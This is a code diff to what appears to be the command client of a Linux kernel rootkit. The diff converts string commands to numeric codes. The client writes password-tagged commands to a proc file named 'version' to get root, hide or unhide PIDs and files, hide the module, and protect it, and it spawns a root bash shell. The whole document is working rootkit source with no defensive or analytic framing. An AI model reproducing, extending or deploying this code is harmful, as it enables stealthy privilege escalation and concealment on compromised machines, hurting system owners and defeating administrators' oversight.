@@ -2,24 +2,42 @@
 
 #define CFG_PROC_FILE "version"
 #define CFG_PASS "password"
-#define CFG_ROOT "root"
-#define CFG_HIDE_PID "hide_pid"
-#define CFG_UNHIDE_PID "unhide_pid"
-#define CFG_HIDE_FILE "hide_file"
-#define CFG_UNHIDE_FILE "unhide_file"
-#define CFG_HIDE "hide"
-#define CFG_UNHIDE "unhide"
-#define CFG_PROTECT "protect"
-#define CFG_UNPROTECT "unprotect"
+#define CFG_ROOT 1
+#define CFG_HIDE_PID 2
+#define CFG_UNHIDE_PID 3
+#define CFG_HIDE_FILE 4
+#define CFG_UNHIDE_FILE 5
+#define CFG_HIDE 6
+#define CFG_UNHIDE 7
+#define CFG_PROTECT 8
+#define CFG_UNPROTECT 9
 
-static char *alloc_buffer(const char *to_alloc, char *argument, int has_argument, size_t *buf_size)
+static char *create_buffer(int input, char *argument, int has_argument, size_t *buf_size)
 {
+    *buf_size = 0;
+
+    *buf_size += sizeof(CFG_PASS);
+
+    if ((input == 1 || (input >= 5 && input <= 9)) && !has_argument)
+    {
+        *buf_size += sizeof(char);
+    }
+    else if (input >= 2 && input <= 4 && has_argument)
+    {
+        *buf_size += sizeof(char) + strlen(argument);
+    }
+    else
+        return NULL;
+
     *buf_size += 1; // for null terminator
 
     char *buffer = malloc(*buf_size);
     buffer[*buf_size - 1] = 0;
 
     char *buf_ptr = buffer;
+    
+    char to_alloc[2];
+    sprintf(to_alloc, "%d", input);
 
     write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
     write_buffer(&buf_ptr, to_alloc, strlen(to_alloc));
@@ -29,71 +47,18 @@ static char *alloc_buffer(const char *to_alloc, char *argument, int has_argument
     return buffer;
 }
 
-static char *create_buffer(char *input, char *argument, int has_argument, size_t *buf_size)
-{
-    *buf_size = 0;
-
-    *buf_size += sizeof(CFG_PASS);
-
-    if (strcmp(CFG_ROOT, input) == 0)
-    {
-        *buf_size += sizeof(CFG_ROOT);
-        return alloc_buffer(CFG_ROOT, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_HIDE_PID, input) == 0 && has_argument)
-    {
-        *buf_size += sizeof(CFG_HIDE_PID) + strlen(argument);
-        return alloc_buffer(CFG_HIDE_PID, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_UNHIDE_PID, input) == 0 && has_argument)
-    {
-        *buf_size += sizeof(CFG_UNHIDE_PID) + strlen(argument);
-        return alloc_buffer(CFG_UNHIDE_PID, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_HIDE_FILE, input) == 0 && has_argument)
-    {
-        *buf_size += sizeof(CFG_HIDE_FILE) + strlen(argument);
-        return alloc_buffer(CFG_HIDE_FILE, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_UNHIDE_FILE, input) == 0 && has_argument)
-    {
-        *buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(argument);
-        return alloc_buffer(CFG_UNHIDE_FILE, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_HIDE, input) == 0)
-    {
-        *buf_size += sizeof(CFG_HIDE);
-        return alloc_buffer(CFG_HIDE, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_UNHIDE, input) == 0)
-    {
-        *buf_size += sizeof(CFG_UNHIDE);
-        return alloc_buffer(CFG_UNHIDE, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_PROTECT, input) == 0)
-    {
-        *buf_size += sizeof(CFG_PROTECT);
-        return alloc_buffer(CFG_PROTECT, argument, has_argument, buf_size);
-    }
-    else if (strcmp(CFG_UNPROTECT, input) == 0)
-    {
-        *buf_size += sizeof(CFG_UNPROTECT);
-        return alloc_buffer(CFG_UNPROTECT, argument, has_argument, buf_size);
-    }
-
-    return NULL;
-}
-
 int start_command(char *input)
 {
     char *argument;
 
     int has_argument = string_split(input, &argument, '=');
 
+    int inputNumber = atoi(input);
+
     char *buffer;
 
     size_t buf_size;
-    buffer = create_buffer(input, argument, has_argument, &buf_size);
+    buffer = create_buffer(inputNumber, argument, has_argument, &buf_size);
 
     if (buffer == NULL)
         return -1;
@@ -103,7 +68,7 @@ int start_command(char *input)
 
     free(buffer);
 
-    if (strcmp(CFG_ROOT, input) == 0)
+    if (inputNumber==CFG_ROOT)
     {
         execl("/bin/bash", "bash", NULL);
     }
